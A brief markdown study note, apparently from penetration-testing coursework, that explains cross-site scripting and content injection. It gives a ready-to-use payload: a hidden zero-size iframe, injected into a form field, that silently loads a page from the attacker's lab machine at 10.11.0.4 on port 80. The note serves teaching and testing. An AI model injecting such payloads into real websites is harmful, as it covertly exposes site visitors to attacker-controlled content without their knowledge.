## Cross Site Scripting (XSS)

An attack where JavaScript code can be injected into the DOM of a website through Form Inputs. 


### Content Injection
If a site is vulnerable to XSS, we can inject an iframe into it, and have any person be redirected to our machine on port 80. Example content injection into a form field: 
```
<iframe src=http://10.11.0.4/report height="0" width="0"></iframe>
```

